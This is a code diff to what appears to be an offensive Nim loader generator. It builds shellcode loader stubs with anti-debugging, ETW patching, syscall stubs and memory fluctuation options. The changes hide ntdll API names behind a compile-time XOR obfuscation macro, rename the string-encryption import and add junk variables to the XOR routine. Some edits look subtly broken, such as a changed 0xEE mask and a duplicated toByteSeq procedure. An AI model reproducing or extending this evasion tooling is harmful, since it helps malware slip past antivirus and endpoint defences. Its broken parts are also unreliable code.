@@ -1446,12 +1446,6 @@ when defined(AntiDebug):
 when defined(ProviderPatch):
     from winregistry/winregistry import RegHandle,open,enumSubkeys,readString,samRead,enumValueNames
 
-when not defined(DInvoke):
-    proc LdrLoadDll*(PathToFile: PWCHAR, Flags: ULONG, ModuleFileName: PUNICODE_STRING, ModuleHandle: PHANDLE): NTSTATUS {.
-        importc: "LdrLoadDll", dynlib: "ntdll", stdcall, discardable.}
-    proc RtlAddVectoredExceptionHandler*(FirstHandler: ULONG, VectoredHandler: PVOID): PVOID {.
-        importc: "RtlAddVectoredExceptionHandler", dynlib: "ntdll", stdcall, discardable.}
-
 when defined(HardwareETW):
   from winim/clr import load,clrVariantToString,new,`.`,VT_BSTR,invoke
 
@@ -1501,7 +1495,7 @@ when defined(HardwareETW):
 
 when not defined(proxy):
     when defined(notcloned):
-        import strenc
+        import nimstrenc
 when defined(Fluctuate):
     import Fluctuation
 
@@ -1523,24 +1517,34 @@ import macros, hashes
 type
     estring = distinct string
 
-proc calcTheThings(s: estring, key: int): string {.noinline.} =
+proc calcTheThings(s: estring, key: int): string {.inline.} =
     var k = key
+    var whatup: char
+    var testString : string = " "
     result = string(s)
     for i in 0 ..< result.len:
         for f in [0, 8, 16, 24]:
-            result[i] = chr(uint8(result[i]) xor uint8((k shr f) and 0xFF))
+            whatup = result[i]
+            testString = testString & " "
+            result[i] = chr(uint8(result[i]) xor uint8((k shr f) and 0xEE))
     k = k +% 1
 
-var eCtr {.compileTime.} = hash(CompileTime & CompileDate) and 0x7FFFFFFF
+var eCtr {.compileTime.} = hash(CompileTime & CompileDate) and 0x7FFFFFEE
 
 macro obf*(s: untyped): untyped =
     if len($s) < 10000:
         var encodedStr = calcTheThings(estring($s), eCtr)
         result = quote do:
             calcTheThings(estring(`encodedStr`), `eCtr`)
-        eCtr = (eCtr *% 16777619) and 0x7FFFFFFF
+        eCtr = (eCtr *% 16777619) and 0x7FFFFFEE
     else:
         result = s
+
+when not defined(DInvoke):
+    proc LdrLoadDll*(PathToFile: PWCHAR, Flags: ULONG, ModuleFileName: PUNICODE_STRING, ModuleHandle: PHANDLE): NTSTATUS {.
+        importc: obf("LdrLoadDll"), dynlib: obf("ntdll"), stdcall, discardable.}
+    proc RtlAddVectoredExceptionHandler*(FirstHandler: ULONG, VectoredHandler: PVOID): PVOID {.
+        importc: obf("RtlAddVectoredExceptionHandler"), dynlib: obf("ntdll"), stdcall, discardable.}
 
 # Decrypt.nim
 func toByteSeq*(str: string): seq[byte] {.inline.} =
@@ -1581,7 +1585,7 @@ var ws2k12: BOOL = 0
 proc `$`(a: array[128, WCHAR]): string = $cast[WideCString](unsafeAddr a[0])
 
 proc rtlGetVersion(lpVersionInformation: var OSVersionInfoExW): NTSTATUS
-    {.cdecl, importc: "RtlGetVersion", dynlib: "ntdll.dll".}
+    {.cdecl, importc: obf("RtlGetVersion"), dynlib: obf("ntdll.dll").}
 
 var versionInfo: OSVersionInfoExW
 echo rtlGetVersion(versionInfo)
@@ -2233,8 +2237,8 @@ if (getfreshstub):
     stub.add(GetSyscallStub)
 
 if(pump):
-    # makes no sense to import strenc when strings should be visible in the binary.
-    stub =  stub.replace("    import strenc", "    from winim import MODULEENTRY32A")
+    # makes no sense to import nimstrenc when strings should be visible in the binary.
+    stub =  stub.replace("    import nimstrenc", "    from winim import MODULEENTRY32A")
     for m in pumpargs:
         if(m == "words"):
             echo "[*] Adding words"
@@ -2582,7 +2586,7 @@ if(service):
         stub.add(ServiceStub)
 
 if (debugMode):
-    stub = stub.replace("import strenc", "from winim import MODULEENTRY32A")
+    stub = stub.replace("import nimstrenc", "from winim import MODULEENTRY32A")
 
 writeFile("Loader.nim", stub)
 echo "Written Loader.nim -> \n\n"
@@ -2870,8 +2874,9 @@ when system.hostOS == "windows":
         if (exist):
             # An additional whitespace at the end causes an compiler error here, so we'll remove it
             basicCompileFlags = basicCompileFlags.replace(" \r\n", "")
-            stub = stub.replace("import strenc", "")
+            stub = stub.replace("import nimstrenc", "")
             stub = stub.replace("when not defined(proxy):", "")
+            stub = stub.replace("when defined(notcloned):", "")
             writeFile("Loader.nim", stub)
 
             echo "Denim compile argument: \r\n"
@@ -3087,3 +3092,11 @@ if(exists):
 
 else:
     echo "\r\nCompilation failed!! Check the error message.\r\n"
+
+
+#[Here comes a function, that takes an string as input and pushes that into a char array ]#
+proc toByteSeq(s: string): seq[byte] =
+    var result: seq[byte] = @[]
+    for c in s:
+        result.add(c.byte)
+    return result
